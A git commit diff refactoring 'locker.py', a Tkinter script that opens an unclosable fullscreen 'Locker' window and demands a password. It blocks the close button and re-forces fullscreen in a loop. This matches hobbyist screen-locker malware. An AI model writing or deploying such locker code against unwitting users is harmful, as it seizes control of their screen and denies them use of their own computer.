bf2d58d3a8d968905c833f254f1bd08a4f3df1ba
Alex Maszanski <39808040+Wreemde@users.noreply.github.com>
2023-04-25 22:38:20 +0400

    Refactored code: changed names of the functions; provided better readability.

--- locker.py
+++ locker.py
@@ -15,19 +15,26 @@ def on_closing():
     root.attributes("-fullscreen", True)
     root.protocol("WM_DELETE_WINDOW", on_closing)
     root.update()
-    root.bind('<Control-KeyPress-c>', callback)
+    root.bind('<Control-KeyPress-c>', on_key_press)
+
 root = Tk()
 root.title("Locker")
 root.attributes("-fullscreen", True)
+
 entry = Entry(root, font = 1)
 entry.place(width = 150, height = 50, x = 600, y = 400)
+
 label0 = Label(root, text = "Locker_by_#571", font = 1)
 label0.grid(row = 0, column = 0)
+
 label1 = Label(root, text = "Write the password and press Ctrl+C", font = 'Arial 20')
 label1.place(x = 470, y = 300)
+
 root.update()
 time.sleep(0.2)
+
 pyautogui.click(675, 420)
 k = False
-while k != True:
+
+while not k: #k != True:
     on_closing()
